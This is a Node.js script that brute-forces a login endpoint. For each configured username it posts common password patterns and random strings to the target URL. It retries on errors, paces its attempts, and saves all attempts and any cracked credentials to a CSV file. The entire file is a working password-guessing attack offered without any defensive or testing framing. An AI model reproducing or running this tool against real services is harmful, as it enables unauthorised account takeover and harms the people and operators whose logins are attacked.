const fetch = require('node-fetch');
const fs = require('fs').promises;
const config = require('./config.json');

const loginUrl = config.loginUrl;
const usernames = config.usernames;
const characters = config.characters;
const passwordConfig = config.passwordConfig;

const results = [];

function generatePassword(length) {
  const allChars = characters.lowercase + characters.uppercase + characters.numbers + characters.special;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * allChars.length);
    password += allChars[randomIndex];
  }
  return password;
}

function generateCommonPatterns(username) {
  return [
    username,
    username + '123',
    username + '2023',
    username.toLowerCase() + '!',
    'P@ssw0rd',
    username.charAt(0).toUpperCase() + username.slice(1) + '123!',
    'Welcome123!',
    'Admin' + username.slice(0, 3),
    'password123',
    'qwerty123',
    'letmein'
  ];
}

async function tryLogin(username, password, retryCount = 0) {
  try {
    const response = await fetch(loginUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        username: username,
        password: password
      })
    });
    const data = await response.json();
    const isSuccess = response.status === 200 && data.success;

    results.push({
      username,
      password,
      status: isSuccess ? 'success' : 'failure',
      responseCode: response.status,
      timestamp: new Date().toISOString()
    });

    if (isSuccess) {
      return { success: true, password };
    } else {
      return { success: false };
    }
  } catch (error) {
    if (retryCount < passwordConfig.maxRetries) {
      await new Promise(resolve => setTimeout(resolve, 2000));
      return tryLogin(username, password, retryCount + 1);
    }
    results.push({
      username,
      password,
      status: 'error',
      responseCode: error.response?.status || 'N/A',
      error: error.message,
      timestamp: new Date().toISOString()
    });
    return { success: false };
  }
}

async function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function saveResults() {
  const csv = ['username,password,status,responseCode,timestamp,error'];
  results.forEach(r => {
    csv.push(`${r.username},${r.password},${r.status},${r.responseCode},${r.timestamp},${r.error || ''}`);
  });
  await fs.writeFile('brute_force_results.csv', csv.join('\n'));
}

async function bruteForceLogin() {
  for (const username of usernames) {
    const commonPatterns = generateCommonPatterns(username);
    const allPasswords = [...commonPatterns];

    for (let i = 0; i < passwordConfig.maxAttemptsPerUser - commonPatterns.length; i++) {
      const length = Math.floor(Math.random() * (passwordConfig.maxLength - passwordConfig.minLength + 1)) + passwordConfig.minLength;
      allPasswords.push(generatePassword(length));
    }

    let attemptCount = 0;
    for (const password of allPasswords) {
      attemptCount++;
      const result = await tryLogin(username, password);
      if (result.success) {
        break;
      }
      await delay(passwordConfig.delayMs);
    }
  }

  await saveResults();
}

bruteForceLogin().catch(async err => {
  await saveResults();
});
